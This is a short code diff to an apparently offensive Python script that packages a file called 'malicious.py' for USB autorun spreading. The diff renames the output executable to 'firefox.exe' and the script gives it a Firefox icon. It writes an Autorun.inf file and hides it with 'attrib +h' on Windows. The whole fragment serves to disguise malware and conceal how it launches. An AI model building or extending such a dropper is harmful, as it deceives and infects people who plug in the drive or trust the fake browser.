@@ -3,7 +3,7 @@ import shutil
 import os
 
 filename = "malicious.py"
-exename = "benign.exe"
+exename = "firefox.exe"
 icon = "Firefox.ico"
 pwd = os.getcwd()
 usbdir = os.path.join(pwd,"USB")
@@ -41,4 +41,5 @@ with open("Autorun.inf","w") as o:
 shutil.move(exename,usbdir)
 shutil.move("Autorun.inf",usbdir)
 if os.name == 'nt':
+
     os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
